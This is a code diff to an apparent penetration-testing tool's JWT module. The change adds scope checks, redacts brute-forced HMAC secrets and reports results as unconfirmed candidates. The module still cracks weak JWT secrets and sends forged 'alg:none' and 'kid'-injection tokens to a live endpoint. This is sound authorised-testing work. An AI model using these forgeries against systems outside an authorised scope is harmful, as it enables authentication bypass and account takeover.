@@ -7,6 +7,7 @@ import hmac
 import json
 import re
 from typing import Any
+from talisman.engine.scope import ScopeViolationError
 from talisman.utils.http_client import TalismanHTTPClient
 from talisman.utils.payload_engine import JWT_WEAK_SECRETS
 from talisman.utils.logger import get_logger, console, print_finding
@@ -139,86 +140,151 @@ async def run(
  crack_secret: bool = True,
  **kwargs: Any,
 ) -> dict[str, Any]:
- console.print(f"\n[module][+] JWT Attack Module[/module]")
- findings: list[dict[str, Any]] = []
-
+ candidates: list[dict[str, Any]] = []
  if not token:
-  console.print(" [dim]No JWT provided — provide --token[/dim]")
-  return {"findings": []}
+  return {
+   "findings": [],
+   "candidates": [],
+   "count": 0,
+   "error": "jwt_token_required",
+  }
 
  decoded = _decode_jwt(token)
  if not decoded:
-  console.print(" [error]Invalid JWT format[/error]")
-  return {"findings": []}
+  return {
+   "findings": [],
+   "candidates": [],
+   "count": 0,
+   "error": "invalid_jwt_format",
+  }
 
- header, payload, sig = decoded
+ header, payload, _ = decoded
  alg = header.get("alg", "unknown")
+ console.print(f"\\n[module][+] Offline JWT Analysis[/module]")
  console.print(f" Algorithm: {alg}")
- console.print(f" Claims: {', '.join(payload.keys())}")
- console.print(f" Exp: {payload.get('exp', 'none')}")
+ console.print(f" Claim names: {', '.join(sorted(str(key) for key in payload.keys()))}")
 
- # — 1. Brute force secret ————————————————————————————————————
- if crack_secret and alg.startswith("HS"):
-  console.print(" Brute-forcing secret...")
+ if crack_secret and alg in {"HS256", "HS384", "HS512"}:
+  # This is an offline HMAC verification. Never print, return or persist the
+  # recovered secret; store only a one-way fingerprint and length.
   found_secret = _brute_secret(token, JWT_WEAK_SECRETS)
   if found_secret:
-   print_finding(f"JWT weak secret found: '{found_secret}'", "critical", target or "jwt")
-   findings.append({"attack": "weak_secret", "secret": found_secret})
-   if session:
-    await session.add_finding(
-     target=target or "jwt", module="jwt",
-     vuln_type="jwt_weak_secret",
-     severity="critical", confidence="confirmed",
-     title=f"JWT signed with weak secret: '{found_secret}'",
-     description="JWT secret was brute-forced. Any attacker can forge tokens.",
-     evidence=f"Token signed with: {found_secret}",
-     remediation="Use a cryptographically random secret of at least 256 bits.",
-     cvss_score=9.8, cwe="CWE-326",
-    )
+   fingerprint = hashlib.sha256(found_secret.encode()).hexdigest()[:20]
+   candidates.append({
+    "type": "jwt_weak_hmac_secret",
+    "algorithm": alg,
+    "confidence": "confirmed_cryptographic_match",
+    "secret_fingerprint": fingerprint,
+    "secret_length": len(found_secret),
+    "secret_value": "[REDACTED]",
+    "requires_forgery_impact_validation": True,
+    "verification_required": (
+     "Verify token acceptance and the effective signing-key scope with a "
+     "dedicated test token. Do not expose the recovered key in logs or reports."
+    ),
+   })
+   console.print("  [warning]JWT HMAC key matched local weak-secret list; secret redacted[/warning]")
 
- # — 2. Algorithm none ————————————————————————————————————————
- none_tokens = _forge_none_alg(token)
+ active_probe_results: list[dict[str, Any]] = []
  if endpoint:
-  async with TalismanHTTPClient(proxy=proxy, timeout=10) as client:
+  if scope is None:
+   return {
+    "findings": [],
+    "candidates": candidates,
+    "count": 0,
+    "error": "scope_enforcer_required_for_live_jwt_tests",
+   }
+  try:
+   scope.assert_in_scope(endpoint)
+   scope.assert_destructive_allowed(endpoint, "GET")
+  except ScopeViolationError as exc:
+   return {
+    "findings": [],
+    "candidates": candidates,
+    "count": 0,
+    "skipped": True,
+    "reason": str(exc),
+   }
+
+  async with TalismanHTTPClient(
+   proxy=proxy,
+   timeout=10,
+   verify_ssl=True,
+   follow_redirects=False,
+   scope=scope,
+  ) as client:
    try:
-    orig = await client.get(endpoint, headers={"Authorization": f"Bearer {token}"})
-    orig_status = orig.status_code
+    baseline = await client.get(
+     endpoint,
+     headers={"Authorization": f"Bearer {token}"},
+     timeout=8,
+    )
    except Exception:
-    orig_status = 200
-   for none_tok in none_tokens[:2]:
-    accepted = await _test_token_against_endpoint(endpoint, none_tok, orig_status, client)
-    if accepted:
-     print_finding("JWT 'alg:none' accepted by server", "critical", endpoint)
-     findings.append({"attack": "alg_none", "token": none_tok})
-     if session:
-      await session.add_finding(
-       target=endpoint, module="jwt",
-       vuln_type="jwt_alg_none",
-       severity="critical", confidence="confirmed",
-       title="JWT algorithm confusion — 'none' algorithm accepted",
-       description="Server accepts unsigned JWTs. Any attacker can forge tokens for any user.",
-       reproduction=f"Replace alg with 'none' and strip signature: {none_tok[:80]}...",
-       remediation="Explicitly validate JWT algorithm on server side. Reject tokens with alg=none.",
-       cvss_score=9.8, cwe="CWE-347",
+    baseline = None
+
+   if baseline is None or baseline.status_code < 200 or baseline.status_code >= 300:
+    active_probe_results.append({
+     "type": "jwt_live_test_skipped",
+     "reason": "Original token did not establish a successful baseline on the supplied endpoint.",
+    })
+   else:
+    baseline_body = baseline.text[:200_000]
+    for forged in _forge_none_alg(token)[:2]:
+     try:
+      response = await client.get(
+       endpoint,
+       headers={"Authorization": f"Bearer {forged}"},
+       timeout=8,
       )
-     break
+      if 200 <= response.status_code < 300:
+       active_probe_results.append({
+        "type": "jwt_alg_none_acceptance_candidate",
+        "confidence": "candidate",
+        "status": response.status_code,
+        "response_matches_baseline": response.text[:200_000] == baseline_body,
+        "verification_required": (
+         "Confirm the server authenticated the forged token as the intended "
+         "principal, not as anonymous or a public endpoint. Compare subject and "
+         "authorization scope using a controlled test account."
+        ),
+       })
+       break
+     except Exception:
+      pass
 
- # — 3. kid injection ——————————————————————————————————————
- kid_variants = _forge_kid_injection(token)
- if endpoint and kid_variants:
-  async with TalismanHTTPClient(proxy=proxy, timeout=10) as client:
-   for variant in kid_variants[:5]:
-    try:
-     r = await client.get(
-      endpoint,
-      headers={"Authorization": f"Bearer {variant['token']}"},
-     )
-     if r.status_code not in (401, 403):
-      print_finding(f"JWT kid injection accepted — kid={variant['kid']}", "critical", endpoint)
-      findings.append({"attack": "kid_injection", **variant})
-      break
-    except Exception:
-     pass
+    for variant in _forge_kid_injection(token)[:5]:
+     try:
+      response = await client.get(
+       endpoint,
+       headers={"Authorization": f"Bearer {variant['token']}"},
+       timeout=8,
+      )
+      if 200 <= response.status_code < 300:
+       active_probe_results.append({
+        "type": "jwt_kid_handling_candidate",
+        "confidence": "candidate",
+        "kid_variant": str(variant["kid"])[:80],
+        "status": response.status_code,
+        "verification_required": (
+         "Confirm that the forged token is authenticated as the intended "
+         "principal and that key selection was influenced by the supplied kid. "
+         "A 2xx response alone is insufficient."
+        ),
+       })
+       break
+     except Exception:
+      pass
 
- console.print(f" JWT analysis complete — {len(findings)} vulnerabilities found")
- return {"findings": findings, "header": header, "payload": payload, "alg": alg}
+ candidates.extend(active_probe_results)
+ console.print(
+  f" JWT assessment complete — {len(candidates)} candidate indicators; "
+  "no raw tokens or recovered secrets were emitted"
+ )
+ return {
+  "findings": [],
+  "candidates": candidates,
+  "count": 0,
+  "algorithm": alg,
+  "claim_names": sorted(str(key) for key in payload.keys()),
+  "live_tests_performed": bool(endpoint and scope is not None),
+ }
